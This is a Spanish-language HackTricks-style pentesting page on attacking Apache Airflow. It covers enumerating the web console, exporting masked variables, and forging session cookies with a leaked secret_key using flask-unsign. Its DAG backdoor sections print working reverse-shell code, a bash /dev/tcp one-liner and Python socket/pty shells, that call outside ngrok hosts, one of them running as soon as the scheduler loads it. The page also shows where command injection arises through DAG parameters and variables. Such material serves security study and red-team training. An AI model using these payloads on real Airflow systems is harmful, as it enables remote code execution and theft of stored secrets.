# Seguridad de Apache Airflow

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en GitHub.

</details>

## Informaci칩n B치sica

[**Apache Airflow**](https://airflow.apache.org) sirve como una plataforma para **orquestar y programar tuber칤as de datos o flujos de trabajo**. El t칠rmino "orquestaci칩n" en el contexto de tuber칤as de datos significa el proceso de organizar, coordinar y gestionar flujos de trabajo de datos complejos que provienen de diversas fuentes. El prop칩sito principal de estas tuber칤as de datos orquestadas es proporcionar conjuntos de datos procesados y consumibles. Estos conjuntos de datos son ampliamente utilizados por una variedad de aplicaciones, incluyendo, pero no limitado a herramientas de inteligencia empresarial, ciencia de datos y modelos de aprendizaje autom치tico, todos los cuales son fundamentales para el funcionamiento de aplicaciones de big data.

B치sicamente, Apache Airflow te permitir치 **programar la ejecuci칩n de c칩digo cuando sucede algo** (evento, cron).

## Laboratorio Local

### Docker-Compose

Puedes utilizar el **archivo de configuraci칩n docker-compose desde** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) para lanzar un entorno completo de Apache Airflow en Docker. (Si est치s en MacOS aseg칰rate de asignar al menos 6GB de RAM a la m치quina virtual de Docker).

### Minikube

Una forma sencilla de **ejecutar Apache Airflow** es hacerlo **con minikube**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Configuraci칩n de Airflow

Airflow podr칤a almacenar **informaci칩n sensible** en su configuraci칩n o es posible encontrar configuraciones d칠biles en su lugar:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## RBAC de Airflow

Antes de comenzar a atacar Airflow, debes entender **c칩mo funcionan los permisos**:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## Ataques

### Enumeraci칩n de la Consola Web

Si tienes **acceso a la consola web**, es posible que puedas acceder a alguna o a toda la siguiente informaci칩n:

* **Variables** (Aqu칤 podr칤a almacenarse informaci칩n sensible personalizada)
* **Conexiones** (Aqu칤 podr칤a almacenarse informaci칩n sensible personalizada)
* Accede a ellas en `http://<airflow>/connection/list/`
* [**Configuraci칩n**](./#airflow-configuration) (Informaci칩n sensible como la **`secret_key`** y contrase침as podr칤an estar almacenadas aqu칤)
* Lista de **usuarios y roles**
* **C칩digo de cada DAG** (que podr칤a contener informaci칩n interesante)

### Obtener Valores de Variables

Las variables pueden almacenarse en Airflow para que los **DAGs** puedan **acceder** a sus valores. Es similar a los secretos de otras plataformas. Si tienes **suficientes permisos**, puedes acceder a ellas en la GUI en `http://<airflow>/variable/list/`.\
Por defecto, Airflow mostrar치 el valor de la variable en la GUI, sin embargo, seg칰n [**esto**](https://marclamberti.com/blog/variables-with-apache-airflow/), es posible establecer una **lista de variables** cuyo **valor** aparecer치 como **asteriscos** en la **GUI**.

![](<../../.gitbook/assets/image (164).png>)

Sin embargo, estos **valores** a칰n pueden ser **obtenidos** a trav칠s de **CLI** (necesitas tener acceso a la base de datos), ejecuci칩n de **DAG arbitrario**, **API** accediendo al punto final de variables (la API debe estar activada) 춰e incluso la GUI misma!\
Para acceder a esos valores desde la GUI, simplemente **selecciona las variables** a las que deseas acceder y **haz clic en Acciones -> Exportar**.\
Otra forma es realizar un **ataque de fuerza bruta** al **valor oculto** utilizando el **filtro de b칰squeda** hasta que lo obtengas:

![](<../../.gitbook/assets/image (152).png>)

### Escalada de Privilegios

Si la configuraci칩n **`expose_config`** est치 establecida en **True**, desde el **rol de Usuario** y **superiores** pueden **leer** la **configuraci칩n en la web**. En esta configuraci칩n, aparece la **`secret_key`**, lo que significa que cualquier usuario con esta clave v치lida puede **crear su propia cookie firmada para hacerse pasar por cualquier otra cuenta de usuario**.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### Puerta trasera DAG (RCE en el trabajador de Airflow)

Si tienes **acceso de escritura** al lugar donde se guardan los **DAGs**, simplemente puedes **crear uno** que te enviar치 una **shell inversa**.\
Ten en cuenta que esta shell inversa se ejecutar치 dentro de un **contenedor de trabajador de Airflow**:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### Puerta trasera DAG (RCE en el planificador de Airflow)

Si configuras algo para que se **ejecute en la ra칤z del c칩digo**, en el momento de escribir esto, ser치 **ejecutado por el planificador** despu칠s de un par de segundos despu칠s de colocarlo dentro de la carpeta del DAG.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### Creaci칩n de DAG

Si logras **comprometer una m치quina dentro del cl칰ster de DAG**, puedes crear nuevos **scripts de DAG** en la carpeta `dags/` y ser치n **replicados en el resto de las m치quinas** dentro del cl칰ster de DAG.

### Inyecci칩n de C칩digo en DAG

Cuando ejecutas un DAG desde la GUI, puedes **pasarle argumentos**.\
Por lo tanto, si el DAG no est치 codificado correctamente, podr칤a ser **vulnerable a Inyecci칩n de Comandos.**\
Eso es lo que sucedi칩 en este CVE: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

Todo lo que necesitas saber para **empezar a buscar inyecciones de comandos en DAGs** es que los **par치metros** se **acceden** con el c칩digo **`dag_run.conf.get("nombre_parametro")`**.

Adem치s, la misma vulnerabilidad podr칤a ocurrir con las **variables** (ten en cuenta que con suficientes privilegios podr칤as **controlar el valor de las variables** en la GUI). Las variables se **acceden con**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
Si se utilizan, por ejemplo, dentro de un comando bash, podr칤as realizar una inyecci칩n de comandos.

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme en** **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
